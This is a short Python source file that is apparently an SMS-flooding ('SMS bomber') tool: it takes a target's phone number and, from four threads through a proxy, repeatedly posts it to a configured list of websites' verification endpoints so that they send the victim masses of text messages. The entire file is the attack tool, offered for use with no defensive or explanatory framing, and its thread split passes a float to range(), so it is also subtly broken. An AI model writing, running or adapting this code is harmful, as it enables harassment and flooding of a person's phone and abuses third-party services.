from requests import post
from threading import Thread

from config import PROXY, SITE_LIST


def spam_sms(number: str, proxy: dict, site_list: list, quantity_sms: int) -> None:
    for _ in range(quantity_sms):
        for site in site_list:
            phone_number = number
            if site['plus_in_number']:
                phone_number = '+' + number

            post(site['url'], json={site['params_for_number']: phone_number}, proxies=proxy)


def start_spam(number: int, quantity_sms: int) -> None:
    for _ in range(4):
        Thread(target=spam_sms, args=(str(number), PROXY, SITE_LIST, quantity_sms/4)).start()
